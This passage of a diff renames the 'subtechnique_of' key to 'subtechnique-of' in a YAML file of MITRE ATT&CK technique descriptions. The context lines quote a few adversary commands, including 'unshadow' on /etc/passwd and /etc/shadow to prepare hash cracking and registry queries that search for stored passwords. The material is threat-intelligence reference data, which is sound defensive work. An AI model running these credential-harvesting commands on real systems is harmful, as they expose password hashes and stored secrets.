     - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
 
     '
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1557.002
@@ -463,7 +788,7 @@
     Sans ARP Spoofing Aug 2003)
 
     '
-  subtechnique_of: T1557
+  subtechnique-of: T1557
   tactics:
   - TA0006
   - TA0009
@@ -500,7 +825,7 @@
     \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
     \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
     \ SANS Attacking Kerberos Nov 2014)"
-  subtechnique_of: T1558
+  subtechnique-of: T1558
   tactics:
   - TA0006
 - id: T1548
@@ -598,7 +923,7 @@
     * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
 
     * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -687,7 +1012,7 @@
     \ other admins) via the global admin role.(Citation: Microsoft O365 Admin Roles)\
     \ \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
     \ or other malicious account activity."
-  subtechnique_of: T1098
+  subtechnique-of: T1098
   tactics:
   - TA0003
 - id: T1137.006
@@ -705,7 +1030,7 @@
 
     Add-ins can be used to obtain persistence because they can be set to execute code
     when an Office application starts. '
-  subtechnique_of: T1137
+  subtechnique-of: T1137
   tactics:
   - TA0003
 - id: T1546.009
@@ -726,7 +1051,7 @@
     be loaded and run in the context of separate processes on the computer. Malicious
     AppCert DLLs may also provide persistence by continuously being triggered by API
     activity. '
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -747,7 +1072,7 @@
     \ AppInit DLLs may also provide persistence by continuously being triggered by\
     \ API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and\
     \ later versions when secure boot is enabled. (Citation: AppInit Secure Boot)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -780,7 +1105,7 @@
     \ it can be used to launch more common techniques as well such as a reverse shell\
     \ via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro\
     \ Malware Targets Macs)"
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1550.001
@@ -814,7 +1139,7 @@
     \ like changing passwords. Access abuse over an API channel can be difficult to\
     \ detect even from the service provider end, as the access can still align well\
     \ with a legitimate workflow."
-  subtechnique_of: T1550
+  subtechnique-of: T1550
   tactics:
   - TA0005
   - TA0008
@@ -826,7 +1151,7 @@
     be highly resource intensive. Repeated requests to those features may be able
     to exhaust system resources and deny access to the application or the server itself.
     (Citation: Arbor AnnualDoSreport Jan 2018)'
-  subtechnique_of: T1499
+  subtechnique-of: T1499
   tactics:
   - TA0040
 - id: T1071
@@ -873,7 +1198,7 @@
     \ install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye\
     \ Application Shimming) Shims can also be abused to establish persistence by continuously\
     \ being invoked by affected programs."
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -893,7 +1218,7 @@
     BIND9 August 2015) Some systems may automatically restart critical applications
     and services when crashes occur, but they can likely be re-exploited to cause
     a persistent DoS condition.'
-  subtechnique_of: T1499
+  subtechnique-of: T1499
   tactics:
   - TA0040
 - id: T1560
@@ -918,7 +1243,7 @@
     methods, such as encryption with XOR or stream ciphers implemented with no external
     library or utility references. Custom implementations of well-known compression
     algorithms have also been used.(Citation: ESET Sednit Part 2)'
-  subtechnique_of: T1560
+  subtechnique-of: T1560
   tactics:
   - TA0009
 - id: T1560.002
@@ -935,7 +1260,7 @@
     Linux, and zip on Windows. Note that the libraries are different from the utilities.
     The libraries can be linked against when compiling, while the utilities require
     spawning a subshell, or a similar execution mechanism.'
-  subtechnique_of: T1560
+  subtechnique-of: T1560
   tactics:
   - TA0009
 - id: T1560.001
@@ -950,7 +1275,7 @@
 
     Some 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS
     or `zip` on Windows systems.'
-  subtechnique_of: T1560
+  subtechnique-of: T1560
   tactics:
   - TA0009
 - id: T1573.002
@@ -968,7 +1293,7 @@
     \ cryptography once a connection is established, but use asymmetric cryptography\
     \ to establish or transmit a key. As such, these protocols are classified as [Asymmetric\
     \ Cryptography](https://attack.mitre.org/techniques/T1573/002)."
-  subtechnique_of: T1573
+  subtechnique-of: T1573
   tactics:
   - TA0011
 - id: T1055.004
@@ -994,7 +1319,7 @@
     \ system/network resources, and possibly elevated privileges. Execution via APC\
     \ injection may also evade detection from security products since the execution\
     \ is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -1013,7 +1338,7 @@
     [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote
     Execution as part of Lateral Movement and or to run a process under the context
     of a specified account.'
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -1033,7 +1358,7 @@
     \ run a process under the context of a specified account (such as SYSTEM).\n\n\
     Note: The <code>at.exe</code> command line utility has been deprecated in current\
     \ versions of Windows in favor of <code>schtasks</code>."
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -1067,7 +1392,7 @@
     <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of
     <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will
     then be executed by the system when the authentication packages are loaded.'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -1145,7 +1470,7 @@
     \ which then get saved to this file when they log out. Attackers can abuse this\
     \ by looking through the file for potential credentials. (Citation: External to\
     \ DA, the OS X Way)"
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1102.002
@@ -1166,7 +1491,7 @@
     \ services, such as those offered by Google or Twitter, makes it easier for adversaries\
     \ to hide in expected noise. Web service providers commonly use SSL/TLS encryption,\
     \ giving adversaries an added level of protection. "
-  subtechnique_of: T1102
+  subtechnique-of: T1102
   tactics:
   - TA0011
 - id: T1027.001
@@ -1185,7 +1510,7 @@
     \ or configured to scan large files. This may also reduce the likelihood of being\
     \ collected for analysis. Public file scanning services, such as VirusTotal, limits\
     \ the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) "
-  subtechnique_of: T1027
+  subtechnique-of: T1027
   tactics:
   - TA0005
 - id: T1547
@@ -1242,7 +1567,7 @@
     The MBR passes control of the boot process to the VBR. Similar to the case of
     MBR, an adversary who has raw access to the boot drive may overwrite the VBR to
     divert execution during startup to adversary code.'
-  subtechnique_of: T1542
+  subtechnique-of: T1542
   tactics:
   - TA0003
   - TA0005
@@ -1257,7 +1582,7 @@
     \ adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566)\
     \ or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation:\
     \ Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)"
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.005
@@ -1274,7 +1599,7 @@
     \ at their disposal, adversaries may perform follow-on activity such as large-scale\
     \ [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial\
     \ of Service (DDoS)."
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1217
@@ -1359,7 +1684,7 @@
     \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195),\
     \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted\
     \ Relationship](https://attack.mitre.org/techniques/T1199))."
-  subtechnique_of: T1591
+  subtechnique-of: T1591
   tactics:
   - TA0043
 - id: T1548.002
@@ -1402,7 +1727,7 @@
     system security mechanism, and the privilege or integrity of a process running
     on one system will be unknown on remote systems and default to high integrity.(Citation:
     SANS UAC Bypass)'
-  subtechnique_of: T1548
+  subtechnique-of: T1548
   tactics:
   - TA0004
   - TA0005
@@ -1425,7 +1750,7 @@
     \ establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
     \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
     \ and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189))."
-  subtechnique_of: T1596
+  subtechnique-of: T1596
   tactics:
   - TA0043
 - id: T1218.003
@@ -1447,7 +1772,7 @@
     \ and execute arbitrary commands from a malicious INF through an auto-elevated\
     \ COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate\
     \ AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)"
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1574.012
@@ -1480,7 +1805,7 @@
     by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary
     COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub
     OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -1508,7 +1833,7 @@
 
     Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation:
     PassLib mscache)'
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1546.001
@@ -1533,7 +1858,7 @@
     \ that are executed when the handler opens the file extension. Adversaries can\
     \ modify these values to continually execute arbitrary commands. (Citation: TrendMicro\
     \ TROJ-FAKEAV OCT 2012)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -1578,7 +1903,7 @@
     also delete the <code>ConsoleHost_history.txt</code> file or edit its contents
     to hide PowerShell commands they have run.(Citation: Sophos PowerShell command
     audit)(Citation: Sophos PowerShell Command History Forensics)'
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1070.002
@@ -1607,7 +1932,7 @@
     * <code>/var/log/httpd/</code>: Web server access and error logs
 
     '
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1070.001
@@ -1632,7 +1957,7 @@
 
     These logs may also be cleared through other mechanisms, such as the event viewer
     GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001).'
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1592.004
@@ -1659,7 +1984,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
     or [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1592
+  subtechnique-of: T1592
   tactics:
   - TA0043
 - id: T1115
@@ -1686,7 +2011,7 @@
 
     Adversaries may create accounts that only have access to specific cloud services,
     which can reduce the chance of detection.'
-  subtechnique_of: T1136
+  subtechnique-of: T1136
   tactics:
   - TA0003
 - id: T1087.004
@@ -1709,7 +2034,7 @@
     \ list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain\
     \ a listing of service accounts and users in a project.(Citation: Google Cloud\
     \ - IAM Servie Accounts List API)"
-  subtechnique_of: T1087
+  subtechnique-of: T1087
   tactics:
   - TA0007
 - id: T1078.004
@@ -1731,7 +2056,7 @@
     Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise
     of federated cloud accounts may allow adversaries to more easily move laterally
     within an environment.'
-  subtechnique_of: T1078
+  subtechnique-of: T1078
   tactics:
   - TA0005
   - TA0003
@@ -1756,7 +2081,7 @@
     authenticated access to a domain. The command <code>az ad user get-member-groups</code>
     will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation:
     Black Hills Red Teaming MS AD Azure, 2018)'
-  subtechnique_of: T1069
+  subtechnique-of: T1069
   tactics:
   - TA0007
 - id: T1580
@@ -1819,7 +2144,7 @@
     API at <code>http[:]//169.254.169.254</code>.
 
     '
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1538
@@ -1873,7 +2198,7 @@
     \ Linux due to the decentralized nature of the platform. (Citation: Wikipedia\
     \ Code Signing) \n\nCode signing certificates may be used to bypass security policies\
     \ that require signed code to execute on a system. "
-  subtechnique_of: T1553
+  subtechnique-of: T1553
   tactics:
   - TA0005
 - id: T1587.002
@@ -1892,7 +2217,7 @@
 
     Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries
     may develop self-signed code signing certificates for use in operations.'
-  subtechnique_of: T1587
+  subtechnique-of: T1587
   tactics:
   - TA0042
 - id: T1588.003
@@ -1915,7 +2240,7 @@
     stolen from a previously compromised entity that allows the adversary to validate
     to a certificate provider as that entity. Adversaries may also steal code signing
     materials directly from a compromised third-party.'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1059
@@ -1984,7 +2309,7 @@
     to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into
     a proper executable binary with a bundled compiler and execution framework.(Citation:
     TrendMicro WindowsAppMac)'
-  subtechnique_of: T1027
+  subtechnique-of: T1027
   tactics:
   - TA0005
 - id: T1218.001
@@ -2005,7 +2330,7 @@
     CHM execution may also bypass application application control on older and/or
     unpatched systems that do not account for execution of binaries through hh.exe.
     (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1542.002
@@ -2023,7 +2348,7 @@
     Malicious component firmware could provide both a persistent level of access to
     systems despite potential typical failures to maintain access and hard disk re-images,
     as well as a way to evade host software-based defenses and integrity checks.'
-  subtechnique_of: T1542
+  subtechnique-of: T1542
   tactics:
   - TA0003
   - TA0005
@@ -2046,7 +2371,7 @@
     fileless download/execution, and other adversary behaviors related to privilege
     escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
     ProjectZero File Write EoP Apr 2018)'
-  subtechnique_of: T1559
+  subtechnique-of: T1559
   tactics:
   - TA0002
 - id: T1546.015
@@ -2067,7 +2392,7 @@
     \ enough to maintain a consistent level of persistence, but are unlikely to break\
     \ noticeable functionality within the system as to avoid system instability that\
     \ could lead to detection. "
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -2162,7 +2487,7 @@
     consumer networks that may be difficult to detect and give the adversary a high
     degree of control over the system. Hardware backdoors may be inserted into various
     devices, such as servers, workstations, network infrastructure, or peripherals.
-  subtechnique_of: T1195
+  subtechnique-of: T1195
   tactics:
   - TA0001
 - id: T1584
@@ -2197,7 +2522,7 @@
     \ Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim\
     \ set or may be distributed to a broad set of consumers but only move on to additional\
     \ tactics on specific victims. "
-  subtechnique_of: T1195
+  subtechnique-of: T1195
   tactics:
   - TA0001
 - id: T1195.002
@@ -2213,7 +2538,7 @@
     Targeting may be specific to a desired victim set or may be distributed to a broad
     set of consumers but only move on to additional tactics on specific victims.(Citation:
     Avast CCleaner3 2018) (Citation: Command Five SK 2011)  '
-  subtechnique_of: T1195
+  subtechnique-of: T1195
   tactics:
   - TA0001
 - id: T1213.001
@@ -2244,7 +2569,7 @@
     * Links to network shares and other internal resources
 
     '
-  subtechnique_of: T1213
+  subtechnique-of: T1213
   tactics:
   - TA0009
 - id: T1218.002
@@ -2282,7 +2607,7 @@
     loaded and executed through its <code>DllEntryPoint</code> when Control Panel
     is executed. CPL files not exporting <code>CPlApplet</code> are not directly executable.(Citation:
     ESET InvisiMole June 2020)'
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1136
@@ -2314,7 +2639,7 @@
 
     Creating a new instance may also allow an adversary to carry out malicious activity
     within an environment without affecting the execution of current running instances.'
-  subtechnique_of: T1578
+  subtechnique-of: T1578
   tactics:
   - TA0005
 - id: T1134.002
@@ -2326,7 +2651,7 @@
     to create a new process running under the security context of the impersonated
     user. This is useful for creating a new process under the security context of
     a different user.
-  subtechnique_of: T1134
+  subtechnique-of: T1134
   tactics:
   - TA0005
   - TA0004
@@ -2347,7 +2672,7 @@
     that allows the adversary access to the created instance, such as a firewall policy
     that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends
     2020)'
-  subtechnique_of: T1578
+  subtechnique-of: T1578
   tactics:
   - TA0005
 - id: T1543
@@ -2390,7 +2715,7 @@
     \ which overwrites the first bytes in an API function to redirect code flow.(Citation:\
     \ Endgame Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking\
     \ Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n"
-  subtechnique_of: T1056
+  subtechnique-of: T1056
   tactics:
   - TA0009
   - TA0006
@@ -2444,7 +2769,7 @@
     and cloud-based applications utilizing federated authentication protocols," as
     well as externally facing email applications, such as Office 365.(Citation: US-CERT
     TA18-068A 2018)'
-  subtechnique_of: T1110
+  subtechnique-of: T1110
   tactics:
   - TA0006
 - id: T1589.001
@@ -2473,7 +2798,7 @@
     resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
     and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
     or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).'
-  subtechnique_of: T1589
+  subtechnique-of: T1589
   tactics:
   - TA0043
 - id: T1552.001
@@ -2496,7 +2821,7 @@
     configuration and credential files. In some cases, these files can be copied and
     reused on another machine or the contents can be read and then used to authenticate
     without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)'
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1555
@@ -2536,7 +2861,7 @@
     \ access. This can result in significantly furthering an adversary's objective\
     \ in cases where credentials gained from web browsers overlap with privileged\
     \ accounts (e.g. domain administrator)."
-  subtechnique_of: T1555
+  subtechnique-of: T1555
   tactics:
   - TA0006
 - id: T1552.002
@@ -2556,7 +2881,7 @@
     * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
 
     * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>'
-  subtechnique_of: T1552
+  subtechnique-of: T1552
   tactics:
   - TA0006
 - id: T1053.003
@@ -2574,7 +2899,7 @@
     programs at system startup or on a scheduled basis for persistence. <code>cron</code>
     can also be abused to conduct remote Execution as part of Lateral Movement and
     or to run a process under the context of a specified account.'
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -2603,7 +2928,7 @@
     DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation:
     GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs
     DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)'
-  subtechnique_of: T1003
+  subtechnique-of: T1003
   tactics:
   - TA0006
 - id: T1574.001
@@ -2645,7 +2970,7 @@
     Programs that fall victim to path hijacking may appear to behave normally because
     malicious DLLs may be configured to also load the legitimate DLLs they were meant
     to replace.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -2671,7 +2996,7 @@
 
     Adversaries likely use this technique as a means of masking actions they perform
     under a legitimate, trusted system or software process.'
-  subtechnique_of: T1574
+  subtechnique-of: T1574
   tactics:
   - TA0003
   - TA0004
@@ -2690,7 +3015,7 @@
     \ may abuse DNS to communicate with systems under their control within a victim\
     \ network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation:\
     \ Medium DnsTunneling) "
-  subtechnique_of: T1071
+  subtechnique-of: T1071
   tactics:
   - TA0011
 - id: T1590.002
@@ -2711,7 +3036,7 @@
     \ operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
     \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
     \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
 - id: T1568.003
@@ -2728,7 +3053,7 @@
     is to take the first three octets of an IP address in a DNS response and use those
     values to calculate the port for command and control traffic.(Citation: Meyers
     Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)'
-  subtechnique_of: T1568
+  subtechnique-of: T1568
   tactics:
   - TA0011
 - id: T1583.002
@@ -2747,7 +3072,7 @@
     With control over a DNS server, adversaries can configure DNS applications to
     provide conditional responses to malware and, generally, have more flexibility
     in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)'
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.002
@@ -2767,7 +3092,7 @@
     FireEye DNS Hijack 2019) Adversaries may also be able to silently create subdomains
     pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation:
     CiscoAngler)(Citation: Proofpoint Domain Shadowing)'
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1596.001
@@ -2789,7 +3114,7 @@
     \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
     \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)\
     \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
-  subtechnique_of: T1596
+  subtechnique-of: T1596
   tactics:
   - TA0043
 - id: T1485
@@ -3060,7 +3385,7 @@
     Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery
     through malware binary analysis while also enabling operational resiliency (since
     this infrastructure may be dynamically changed).'
-  subtechnique_of: T1102
+  subtechnique-of: T1102
   tactics:
   - TA0011
 - id: T1491
@@ -3094,7 +3419,7 @@
     Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to
     legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation:
     Metasploit SSH Module)'
-  subtechnique_of: T1078
+  subtechnique-of: T1078
   tactics:
   - TA0005
   - TA0003
@@ -3112,7 +3437,7 @@
     An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
     and later terminate the instance after achieving their objectives.(Citation: Mandiant
     M-Trends 2020)'
-  subtechnique_of: T1578
+  subtechnique-of: T1578
   tactics:
   - TA0005
 - id: T1140
@@ -3162,7 +3487,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware
     Additions](https://attack.mitre.org/techniques/T1200)).'
-  subtechnique_of: T1591
+  subtechnique-of: T1591
   tactics:
   - TA0043
 - id: T1587
@@ -3203,7 +3528,7 @@
     their operations, such as encrypting C2 traffic (ex: [Web Protocols](https://attack.mitre.org/techniques/T1071/001))
     or even enabling [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557)
     if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).'
-  subtechnique_of: T1587
+  subtechnique-of: T1587
   tactics:
   - TA0042
 - id: T1588.004
@@ -3236,7 +3561,7 @@
 
     Adversaries may register or hijack domains that they will later purchase an SSL/TLS
     certificate for.'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1596.003
@@ -3262,7 +3587,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
     or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).'
-  subtechnique_of: T1596
+  subtechnique-of: T1596
   tactics:
   - TA0043
 - id: T1498.001
@@ -3287,7 +3612,7 @@
     clients becomes exceedingly difficult. Botnets have been used in some of the most
     high-profile DDoS flooding attacks, such as the 2012 series of incidents that
     targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)'
-  subtechnique_of: T1498
+  subtechnique-of: T1498
   tactics:
   - TA0040
 - id: T1006
@@ -3316,7 +3641,7 @@
     \ detection of their activities. For example, in AWS an adversary may disable\
     \ CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation:\
     \ Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)"
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1600.002
@@ -3336,7 +3661,7 @@
     \ with attacks to weaken the strength of the cipher in software (e.g., [Reduce\
     \ Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco\
     \ Blog Legacy Device Attacks)"
-  subtechnique_of: T1600
+  subtechnique-of: T1600
   tactics:
   - TA0005
 - id: T1562.002
@@ -3351,7 +3676,7 @@
     Adversaries may targeting system-wide logging or just that of a particular application.
     By disabling Windows event logging, adversaries can operate while leaving less
     evidence of a compromise behind.'
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1562.007
@@ -3369,7 +3694,7 @@
     \ connectivity.(Citation: Expel IO Evil in AWS)\n\nModifying or disabling a cloud\
     \ firewall may enable adversary C2 communications, lateral movement, and/or data\
     \ exfiltration that would otherwise not be allowed."
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1562.004
@@ -3384,7 +3709,7 @@
 
     Modifying or disabling a system firewall may enable adversary C2 communications,
     lateral movement, and/or data exfiltration that would otherwise not be allowed. '
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1562.001
@@ -3395,7 +3720,7 @@
     or event logging processes, deleting Registry keys so that tools do not start
     at run time, or other methods to interfere with security tools scanning or reporting
     information.
-  subtechnique_of: T1562
+  subtechnique-of: T1562
   tactics:
   - TA0005
 - id: T1561.001
@@ -3427,7 +3752,7 @@
     Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
     Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta
     Blockbuster Destructive Malware)'
-  subtechnique_of: T1561
+  subtechnique-of: T1561
   tactics:
   - TA0040
 - id: T1561.002
@@ -3453,7 +3778,7 @@
     \ Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec\
     \ Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon\
     \ Nov 2016)(Citation: Kaspersky StoneDrill 2017)"
-  subtechnique_of: T1561
+  subtechnique-of: T1561
   tactics:
   - TA0040
 - id: T1561
@@ -3508,7 +3833,7 @@
     and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM
     created instance of a Microsoft Office application(Citation: Cyberreason DCOM
     DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.'
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1136.002
@@ -3524,7 +3849,7 @@
 
     Such accounts may be used to establish secondary credentialed access that do not
     require persistent remote access tools to be deployed on the system.'
-  subtechnique_of: T1136
+  subtechnique-of: T1136
   tactics:
   - TA0003
 - id: T1087.002
@@ -3539,7 +3864,7 @@
     of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil
     -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain
     users and groups.'
-  subtechnique_of: T1087
+  subtechnique-of: T1087
   tactics:
   - TA0007
 - id: T1078.002
@@ -3556,7 +3881,7 @@
     Adversaries may compromise domain accounts, some with a high level of privileges,
     through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
     or password reuse, allowing access to privileged resources of the domain.'
-  subtechnique_of: T1078
+  subtechnique-of: T1078
   tactics:
   - TA0005
   - TA0003
@@ -3577,7 +3902,7 @@
     \ key is erased from memory by a reboot of the domain controller). Authenticated\
     \ access may enable unfettered access to hosts and/or resources within single-factor\
     \ authentication environments.(Citation: Dell Skeleton)"
-  subtechnique_of: T1556
+  subtechnique-of: T1556
   tactics:
   - TA0006
   - TA0005
@@ -3600,7 +3925,7 @@
     For example, if domain-x and domain-y are customers of the same CDN, it is possible
     to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will
     appear to be going to domain-x, however the CDN may route it to domain-y.'
-  subtechnique_of: T1090
+  subtechnique-of: T1090
   tactics:
   - TA0011
 - id: T1568.002
@@ -3625,7 +3950,7 @@
     \ is lost with the primary command and control server malware may employ a DGA\
     \ as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation:\
     \ FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)"
-  subtechnique_of: T1568
+  subtechnique-of: T1568
   tactics:
   - TA0011
 - id: T1069.002
@@ -3641,7 +3966,7 @@
     Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039)
     utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code>
     on Linux can list domain-level groups.'
-  subtechnique_of: T1069
+  subtechnique-of: T1069
   tactics:
   - TA0007
 - id: T1590.001
@@ -3667,7 +3992,7 @@
     operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
     or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or
     initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).'
-  subtechnique_of: T1590
+  subtechnique-of: T1590
   tactics:
   - TA0043
 - id: T1482
@@ -3715,7 +4040,7 @@
     owns a purchased domain. Adversaries may further interrupt efforts to track their
     infrastructure by using varied registration information and purchasing domains
     with different domain registrars.(Citation: Mandiant APT1)'
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.001
